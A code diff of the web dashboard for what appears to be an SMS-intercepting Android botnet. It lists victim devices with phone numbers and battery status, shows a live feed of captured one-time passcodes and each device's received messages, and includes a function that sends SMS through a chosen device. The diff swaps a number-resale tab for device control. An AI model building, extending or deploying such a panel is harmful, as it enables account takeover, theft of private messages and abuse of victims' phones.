@@ -8,23 +8,23 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/app.css">
   <style>
-    .num-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:.625rem .75rem;margin-bottom:.375rem;display:flex;align-items:center;gap:.625rem;flex-wrap:wrap}
-    .num-main{flex:1;min-width:0}
-    .num-phone{font-family:'JetBrains Mono',monospace;font-size:1rem;font-weight:700;color:var(--accent);letter-spacing:.03em}
-    .num-meta{font-size:.6875rem;color:var(--text-muted);margin-top:2px;display:flex;gap:.5rem;flex-wrap:wrap}
-    .num-actions{display:flex;gap:.25rem;flex-shrink:0}
-    .copy-btn{background:var(--accent-subtle);color:var(--accent);border:1px solid rgba(6,182,212,.15);border-radius:var(--radius);padding:.25rem .5rem;font-size:.625rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s}
-    .copy-btn:hover{background:rgba(6,182,212,.15)}
-    .copy-btn.copied{background:var(--green-subtle);color:var(--green);border-color:rgba(34,197,94,.15)}
+    .dev-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:.75rem;margin-bottom:.5rem;cursor:pointer;transition:border-color .15s}
+    .dev-card:hover{border-color:var(--border-hover)}
+    .dev-head{display:flex;align-items:center;justify-content:space-between;gap:.5rem;margin-bottom:.4rem}
+    .dev-head strong{font-size:.8125rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+    .dev-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.25rem .5rem;font-size:.6875rem;color:var(--text-muted)}
+    .dev-grid .val{color:var(--text);font-weight:600;margin-top:1px}
     .otp-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:.625rem .75rem;margin-bottom:.375rem;display:flex;align-items:flex-start;gap:.625rem;flex-wrap:wrap}
     .otp-code{font-family:'JetBrains Mono',monospace;font-size:1.125rem;font-weight:800;color:var(--accent);letter-spacing:.05em;flex-shrink:0}
     .otp-info{font-size:.6875rem;color:var(--text-muted);flex:1;min-width:0}
     .otp-info .svc{font-weight:600;color:var(--text-secondary)}
     .otp-info .phone{font-family:monospace}
     .otp-time{font-size:.625rem;color:var(--text-dim);flex-shrink:0;text-align:right}
-    .search-box{width:100%;padding:.5rem .75rem;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:.8125rem;font-family:inherit;margin-bottom:.75rem}
-    .search-box:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-subtle)}
-    @media(max-width:480px){.otp-card,.num-card{padding:.5rem}.otp-code{font-size:1rem}.num-phone{font-size:.875rem}}
+    @media(max-width:480px){.otp-card{padding:.5rem}.otp-code{font-size:1rem}.dev-grid{grid-template-columns:repeat(2,1fr)}}
+    .modal-bg{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);align-items:center;justify-content:center;padding:1rem}
+    .modal-bg.open{display:flex}
+    .modal-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);max-width:560px;width:100%;max-height:85vh;overflow-y:auto;padding:1.25rem}
+    @media(max-width:480px){.modal-box{margin:0 .5rem;padding:1rem}}
   </style>
 </head>
 <body>
@@ -39,44 +39,45 @@
 
       <div class="stats-grid">
         <div class="stat-card"><div class="stat-value" style="color:var(--green)" id="s-online">—</div><div class="stat-label">Online</div></div>
-        <div class="stat-card"><div class="stat-value" style="color:var(--accent)" id="s-numbers">—</div><div class="stat-label">Numbers</div></div>
+        <div class="stat-card"><div class="stat-value" style="color:var(--accent)" id="s-total">—</div><div class="stat-label">Devices</div></div>
         <div class="stat-card"><div class="stat-value" style="color:var(--purple)" id="s-otps">—</div><div class="stat-label">OTPs</div></div>
         <div class="stat-card"><div class="stat-value" style="color:var(--amber)" id="s-conn">—</div><div class="stat-label">Databases</div></div>
       </div>
 
       <div class="tabs">
-        <button class="tab active" data-tab="numbers">Get Numbers</button>
+        <button class="tab active" data-tab="devices">Devices</button>
         <button class="tab" data-tab="otps">OTP Feed</button>
       </div>
 
-      <!-- Get Numbers -->
-      <div id="tab-numbers" class="tab-content">
+      <div id="tab-devices" class="tab-content">
         <div class="card">
-          <div class="card-header">
-            <div><div class="card-title">Available Numbers</div><div class="card-subtitle" id="numCount">Loading...</div></div>
-            <button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button>
-          </div>
-          <input class="search-box" id="numSearch" placeholder="Search by number, country, carrier..." oninput="filterNumbers()">
-          <div id="numberList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading numbers...</p></div></div>
+          <div class="card-header"><div><div class="card-title">All Devices</div><div class="card-subtitle" id="devCount">Loading...</div></div><button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button></div>
+          <div id="deviceList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading devices...</p></div></div>
         </div>
       </div>
 
-      <!-- OTP Feed -->
       <div id="tab-otps" class="tab-content" style="display:none">
         <div class="card">
-          <div class="card-header">
-            <div><div class="card-title">Live OTP Feed</div><div class="card-subtitle">Auto-refreshes every 30s</div></div>
-            <button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button>
-          </div>
+          <div class="card-header"><div><div class="card-title">Live OTP Feed</div><div class="card-subtitle">Auto-refreshes every 30s</div></div><button class="btn btn-secondary btn-sm" onclick="loadDashboard()">Refresh</button></div>
           <div id="otpList"><div class="empty-state"><div class="spinner" style="margin:0 auto 1rem"></div><p>Loading...</p></div></div>
         </div>
       </div>
     </main>
   </div>
 
+  <!-- Device Modal -->
+  <div id="deviceModal" class="modal-bg" onclick="if(event.target===this)closeModal()">
+    <div class="modal-box">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem">
+        <h2 id="modalTitle" style="font-size:1rem;font-weight:700">Device</h2>
+        <button class="btn btn-secondary btn-sm" onclick="closeModal()">Close</button>
+      </div>
+      <div id="modalBody"></div>
+    </div>
+  </div>
+
   <script>
     let currentUser = null;
-    let allNumbers = [];
 
     async function init() {
       const res = await fetch("/api/auth/me", { credentials: "include" });
@@ -99,8 +100,39 @@
       } catch (err) { document.getElementById("subtitle").textContent = "Error: " + err.message; }
     }
 
+    function render(d) {
+      document.getElementById("s-online").textContent = d.devices.online;
+      document.getElementById("s-total").textContent = d.devices.total;
+      document.getElementById("s-otps").textContent = d.otps.total;
+      document.getElementById("s-conn").textContent = d.connections;
+      document.getElementById("subtitle").textContent = d.devices.online + " online / " + d.devices.total + " total · " + d.connections + " db(s)";
+      document.getElementById("devCount").textContent = d.devices.total + " device(s)";
+      renderDevices(d.devices.list);
+      renderOtps(d.otps.recent);
+    }
+
+    function renderDevices(devices) {
+      const el = document.getElementById("deviceList");
+      if (!devices.length) { el.innerHTML = `<div class="empty-state"><h3>No devices</h3><p>Admin needs to add Firebase databases first.</p></div>`; return; }
+      let html = "";
+      for (const d of devices) {
+        const badge = d.status ? '<span class="badge badge-green">Online</span>' : '<span class="badge badge-red">Offline</span>';
+        const bat = d.batteryPercent >= 60 ? "var(--green)" : d.batteryPercent >= 30 ? "var(--amber)" : "var(--red)";
+        html += `<div class="dev-card" onclick="viewDevice('${esc(d.id)}')">
+          <div class="dev-head"><strong>${esc(d.name)}</strong>${badge}</div>
+          <div class="dev-grid">
+            <div><span style="font-size:.5625rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-dim)">Android</span><div class="val">${d.android !== "—" ? "v" + d.android.replace("v","") : "—"}</div></div>
+            <div><span style="font-size:.5625rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-dim)">Battery</span><div class="val" style="color:${bat}">${d.batteryPercent}%</div></div>
+            <div><span style="font-size:.5625rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-dim)">Phone</span><div class="val" style="font-family:monospace;font-size:.6875rem">${maskPhone(d.phoneNumber)}</div></div>
+          </div>
+          <div class="item-meta" style="margin-top:.4rem;font-size:.625rem;color:var(--text-dim)">${esc(d.provider)} · ${esc(d.source || "")}</div>
+        </div>`;
+      }
+      el.innerHTML = html;
+    }
+
     function maskPhone(phone) {
-      if (!phone || phone === "Unknown" || phone === "—") return "CYRUS";
+      if (!phone || phone === "Unknown") return "CYRUS";
       const d = String(phone).replace(/[^0-9]/g, "");
       if (d.length < 7) return "CYRUS";
       const ccMap = {91:1,1:1,44:2,61:2,86:2,81:2,82:2,62:2,60:2,63:2,66:2,84:2,90:2,92:2,880:3,94:2,977:3,95:2,855:3,234:3,254:3,27:2,20:2,212:3,213:3,216:3,233:3,225:3,228:3,229:3,221:3,509:3,55:2,52:2,54:2,57:2,51:2,56:2,7:1,380:3,48:2,49:2,33:2,34:2,39:2,31:2,32:2,41:2,43:2,46:2,47:2,45:2,358:3,351:3,30:2,36:2,420:3,966:3,971:3,974:3,965:3,968:3,973:3,962:3,961:3,964:3,98:2,972:3};
@@ -108,62 +140,6 @@
       for (let l = 3; l >= 1; l--) { if (ccMap[d.substring(0,l)]) { cc = d.substring(0,l); break; } }
       if (!cc) cc = d.substring(0,2);
       return cc + "CYRUS" + d.slice(-5);
-    }
-
-    function render(d) {
-      const numbers = d.devices.list.filter(dev => dev.phoneNumber && dev.phoneNumber !== "—");
-      document.getElementById("s-online").textContent = d.devices.online;
-      document.getElementById("s-numbers").textContent = numbers.length;
-      document.getElementById("s-otps").textContent = d.otps.total;
-      document.getElementById("s-conn").textContent = d.connections;
-      document.getElementById("subtitle").textContent = numbers.length + " numbers · " + d.devices.online + " online · " + d.connections + " db(s)";
-      allNumbers = numbers;
-      renderNumbers(numbers);
-      renderOtps(d.otps.recent);
-    }
-
-    function renderNumbers(numbers) {
-      const el = document.getElementById("numberList");
-      document.getElementById("numCount").textContent = numbers.length + " number(s)";
-      if (!numbers.length) { el.innerHTML = `<div class="empty-state"><h3>No numbers</h3><p>No devices with phone numbers found.</p></div>`; return; }
-      let html = "";
-      for (const d of numbers) {
-        const badge = d.status ? '<span class="badge badge-green">Online</span>' : '<span class="badge badge-red">Offline</span>';
-        const masked = maskPhone(d.phoneNumber);
-        html += `<div class="num-card" data-search="${(d.phoneNumber + ' ' + d.provider + ' ' + d.name).toLowerCase()}">
-          <div class="num-main">
-            <div class="num-phone">${masked}</div>
-            <div class="num-meta">
-              ${badge}
-              <span>${esc(d.provider || "—")}</span>
-              <span>${esc(d.name)}</span>
-              ${d.batteryPercent ? '<span>' + d.batteryPercent + '% battery</span>' : ''}
-            </div>
-          </div>
-          <div class="num-actions">
-            <button class="copy-btn" onclick="copyNum(this, '${esc(d.phoneNumber)}')">Copy Full</button>
-            <button class="copy-btn" onclick="copyNum(this, '${masked}')">Copy Masked</button>
-          </div>
-        </div>`;
-      }
-      el.innerHTML = html;
-    }
-
-    function filterNumbers() {
-      const q = document.getElementById("numSearch").value.toLowerCase();
-      const filtered = allNumbers.filter(d => {
-        const hay = (d.phoneNumber + " " + d.provider + " " + d.name + " " + maskPhone(d.phoneNumber)).toLowerCase();
-        return hay.includes(q);
-      });
-      renderNumbers(filtered);
-    }
-
-    function copyNum(btn, text) {
-      navigator.clipboard.writeText(text).then(() => {
-        btn.classList.add("copied");
-        btn.textContent = "Copied!";
-        setTimeout(() => { btn.classList.remove("copied"); btn.textContent = text === maskPhone(text) ? "Copy Masked" : "Copy Full"; }, 1500);
-      });
     }
 
     function renderOtps(otps) {
@@ -179,6 +155,40 @@
       }
       el.innerHTML = html;
     }
+
+    async function viewDevice(id) {
+      const modal = document.getElementById("deviceModal");
+      modal.classList.add("open");
+      document.getElementById("modalTitle").textContent = "Loading...";
+      document.getElementById("modalBody").innerHTML = '<div class="spinner" style="margin:1rem auto"></div>';
+      try {
+        const res = await fetch(`/api/dashboard/devices/${id}`, { credentials: "include" });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error);
+        const d = data.device;
+        document.getElementById("modalTitle").textContent = d.name;
+        let html = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin-bottom:1rem">';
+        const fields = [["Model",d.model],["Android",d.android],["Battery",d.batteryPercent+"%"],["Phone",d.phoneNumber],["Network",d.provider],["Status",d.status?"Online":"Offline"]];
+        for (const [l,v] of fields) html += `<div><div style="font-size:.5625rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:.06em">${l}</div><div style="font-size:.8125rem;font-weight:600;margin-top:1px">${esc(String(v))}</div></div>`;
+        html += '</div>';
+        if (data.messages.length) {
+          html += `<div style="font-size:.75rem;font-weight:600;margin-bottom:.5rem">Messages (${data.messages.length})</div>`;
+          html += '<div style="max-height:180px;overflow-y:auto;border:1px solid var(--border);border-radius:var(--radius)">';
+          for (const m of data.messages.slice(0,15)) html += `<div style="padding:.4rem .625rem;border-bottom:1px solid var(--border);font-size:.6875rem"><div style="color:var(--text-muted);font-size:.6rem">${esc(m.sender)}</div><div style="margin-top:1px">${esc(m.text).slice(0,120)}</div></div>`;
+          html += '</div>';
+        }
+        html += `<div style="margin-top:1rem;padding-top:.75rem;border-top:1px solid var(--border)"><div style="font-size:.75rem;font-weight:600;margin-bottom:.5rem">Send SMS</div><div style="display:flex;gap:.375rem;flex-wrap:wrap"><input class="form-input" id="sms-to" placeholder="Phone" style="flex:1;min-width:100px"><input class="form-input" id="sms-msg" placeholder="Message" style="flex:2;min-width:140px"><button class="btn btn-primary btn-sm" onclick="sendSms('${id}')">Send</button></div></div>`;
+        document.getElementById("modalBody").innerHTML = html;
+      } catch (err) { document.getElementById("modalBody").innerHTML = `<div class="alert alert-error">${err.message}</div>`; }
+    }
+
+    async function sendSms(id) {
+      const to = document.getElementById("sms-to").value, message = document.getElementById("sms-msg").value;
+      if (!to || !message) return showAlert("Fill phone and message", "error");
+      try { const r = await fetch(`/api/dashboard/devices/${id}/sms`, { method:"POST", headers:{"Content-Type":"application/json"}, credentials:"include", body: JSON.stringify({to, message}) }); const d = await r.json(); if (!r.ok) throw new Error(d.error); showAlert("SMS queued!", "success"); } catch (e) { showAlert(e.message, "error"); }
+    }
+
+    function closeModal() { document.getElementById("deviceModal").classList.remove("open"); }
 
     document.querySelectorAll(".tab").forEach(t => t.addEventListener("click", () => {
       document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
